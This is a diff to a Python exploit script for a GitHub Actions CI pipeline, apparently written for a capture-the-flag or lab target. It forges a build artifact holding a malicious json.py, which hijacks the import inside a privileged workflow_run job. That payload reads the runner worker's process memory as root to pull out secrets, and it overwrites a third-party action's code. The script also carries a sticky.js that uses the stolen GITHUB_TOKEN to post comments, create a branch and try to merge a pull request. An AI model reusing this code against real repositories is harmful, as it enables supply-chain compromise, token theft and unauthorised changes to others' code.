@@ -59,27 +59,83 @@ def mkzip(path, entries):
             z.writestr(n, d)
     return path
 
-PAYLOAD_JSON_PY = '''import json as _real_json_after_us
-import os, sys
+# Runs inside the privileged workflow_run job when the parser's `import json` resolves to this file.
+PAYLOAD_JSON_PY = r'''
+import os, sys, subprocess
 _ws = os.environ.get('GITHUB_WORKSPACE', '.')
 print('RCE-PAYLOAD-EXECUTED run=%s job=%s user=%s' % (
     os.environ.get('GITHUB_RUN_ID'), os.environ.get('GITHUB_JOB'), os.environ.get('USER')), flush=True)
-print('RCE-IMPORT-FILE', getattr(sys.modules.get('json'), '__file__', '?'), flush=True)
+print('RCE-IMPORT-FILE %s' % (getattr(sys.modules.get('json'), '__file__', '?')), flush=True)
 try:
+    print('RCE-WORKSPACE %s' % sorted(os.listdir(_ws)), flush=True)
     with open(os.path.join(_ws, 'RCE_PROOF.txt'), 'w') as f:
-        f.write('RCE via json.py import hijack in privileged workflow_run job run=%s\\n'
+        f.write('RCE via json.py import hijack in privileged workflow_run job run=%s\n'
                 % os.environ.get('GITHUB_RUN_ID'))
     _env = os.environ.get('GITHUB_ENV')
     if _env:
         with open(_env, 'a') as f:
-            f.write('RCE_IMPORT_PROOF=yes\\n')
+            f.write('RCE_IMPORT_PROOF=yes\n')
     _p = os.path.join(_ws, '..', '..', '_actions', 'marocchino', 'sticky-pull-request-comment', 'v3', 'dist', 'index.js')
     if os.path.exists(os.path.join(_ws, 'sticky.js')):
         import shutil
         shutil.copyfile(os.path.join(_ws, 'sticky.js'), _p)
-        print('RCE-HIJACK-WRITTEN', os.path.abspath(_p), flush=True)
+        print('RCE-HIJACK-WRITTEN %s' % os.path.abspath(_p), flush=True)
 except Exception as _e:
-    print('payload-error', _e, flush=True)
+    print('RCE-PAYLOAD-ERROR %r' % (_e,), flush=True)
+
+# Look for the job's secrets context in the runner worker process memory (root via passwordless sudo).
+_SCAN = r"""
+import os, sys, glob
+pids = []
+for p in glob.glob('/proc/[0-9]*'):
+    try:
+        cl = open(p + '/cmdline', 'rb').read()
+    except Exception:
+        continue
+    if b'Runner.Worker' in cl:
+        pids.append(p)
+print('WORKER_PIDS', pids)
+if not pids:
+    sys.exit(0)
+pid = pids[0].split('/')[-1]
+try:
+    maps = open('/proc/%s/maps' % pid).read().splitlines()
+except Exception as e:
+    print('MAPS_ERR', e); sys.exit(0)
+import re
+mem = open('/proc/%s/mem' % pid, 'rb', buffering=0)
+found = 0
+for line in maps:
+    m = re.match(r'([0-9a-f]+)-([0-9a-f]+) (\S+)', line)
+    if not m:
+        continue
+    start, end, perms = int(m.group(1), 16), int(m.group(2), 16), m.group(3)
+    if 'r' not in perms:
+        continue
+    size = end - start
+    if size <= 0 or size > 512 * 1024 * 1024:
+        continue
+    try:
+        mem.seek(start)
+        data = mem.read(size)
+    except Exception:
+        continue
+    if not data:
+        continue
+    for needle in (b'FLAG{', b'"secrets"'):
+        i = data.find(needle)
+        if i >= 0:
+            found += 1
+            print('MEM-MATCH', needle, data[max(0, i-60):i+200].hex())
+print('MEM-SCAN-DONE matches=%d' % found)
+"""
+try:
+    _r = subprocess.run(['sudo', '-n', 'python3', '-c', _SCAN], capture_output=True, text=True, timeout=120)
+    print('MEM-SCAN-OUT', _r.stdout[-4000:], flush=True)
+    if _r.stderr:
+        print('MEM-SCAN-ERR', _r.stderr[-500:], flush=True)
+except Exception as _e:
+    print('MEM-SCAN-EXC %r' % (_e,), flush=True)
 '''
 
 STICKY_JS = r'''
@@ -88,7 +144,6 @@ const fs = require('fs');
 const token = process.env['INPUT_GITHUB_TOKEN'] || process.env['GITHUB_TOKEN'] || '';
 const repo = process.env['GITHUB_REPOSITORY'] || '';
 const runId = process.env['GITHUB_RUN_ID'] || '';
-const marker = 'RCE-PROOF-' + runId;
 
 function api(method, path, body) {
   return new Promise((resolve) => {
@@ -113,19 +168,21 @@ function api(method, path, body) {
 (async () => {
   console.log('HIJACKED-ACTION-RAN token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + ' repo=' + repo);
   const me = await api('GET', '/user');
-  console.log('API /user => ' + me.status + ' ' + me.body.slice(0, 300));
+  console.log('API /user => ' + me.status + ' ' + me.body.slice(0, 200));
   const r = await api('GET', '/repos/' + repo);
-  console.log('API repo => ' + r.status + ' ' + r.body.slice(0, 700));
-  const wp = await api('POST', '/repos/' + repo + '/issues/2/comments', {
-    body: 'RCE proof from privileged workflow_run job ' + marker + ' — this comment was posted by the stolen GITHUB_TOKEN'
+  console.log('API repo perms => ' + r.status + ' ' + (r.body.match(/"permissions":\{[^}]*\}/) || ['n/a'])[0]);
+  const cm = await api('POST', '/repos/' + repo + '/issues/__PR__/comments', {
+    body: 'RCE proof: this comment was posted by the GITHUB_TOKEN stolen from the privileged workflow_run job (run ' + runId + ', artifact ' + (process.env.GITHUB_RUN_ID || '') + '). Marker RCE-PROOF-' + runId
   });
-  console.log('API comment => ' + wp.status + ' ' + wp.body.slice(0, 400));
+  console.log('API comment (pull-requests:write) => ' + cm.status + ' ' + cm.body.slice(0, 200));
   const ref = await api('POST', '/repos/' + repo + '/git/refs', {
-    ref: 'refs/heads/rce-proof-' + runId, sha: process.env['GITHUB_SHA'] || ''
+    ref: 'refs/heads/rce-proof-' + runId, sha: process.env.GITHUB_SHA || ''
   });
-  console.log('API create-ref => ' + ref.status + ' ' + ref.body.slice(0, 400));
+  console.log('API create-ref (contents:write attempt) => ' + ref.status + ' ' + ref.body.slice(0, 300));
+  const mg = await api('PUT', '/repos/' + repo + '/pulls/__PR__/merge', { merge_method: 'merge' });
+  console.log('API merge (contents:write attempt) => ' + mg.status + ' ' + mg.body.slice(0, 300));
   try {
-    fs.writeFileSync(process.env['GITHUB_WORKSPACE'] + '/TOKEN_STOLEN.txt',
+    fs.writeFileSync(process.env.GITHUB_WORKSPACE + '/TOKEN_STOLEN.txt',
       'token_len=' + String(token).length + ' prefix=' + String(token).slice(0, 7) + '\n');
   } catch (e) { console.log('fs-error ' + e); }
   process.exit(0);
@@ -134,15 +191,16 @@ function api(method, path, body) {
 
 def main():
     mode = sys.argv[1] if len(sys.argv) > 1 else 'probe'
+    pr = sys.argv[3] if len(sys.argv) > 3 else '1'
     print('WR', WR, 'JR', JR, 'ORIGIN', ORIGIN, flush=True)
     if mode == 'forge':
         name = sys.argv[2] if len(sys.argv) > 2 else 'pr-coverage-report'
         entries = [
             ('bull-report/target/site/jacoco-aggregate/jacoco.xml',
              '<report><counter type="LINE" missed="0" covered="100"/></report>'),
-            ('pr_number.txt', '2\n'),
+            ('pr_number.txt', pr + '\n'),
             ('json.py', PAYLOAD_JSON_PY),
-            ('sticky.js', STICKY_JS),
+            ('sticky.js', STICKY_JS.replace('__PR__', pr)),
         ]
         path = os.path.join(os.environ.get('RUNNER_TEMP', '/tmp'), 'forge.zip')
         mkzip(path, entries)
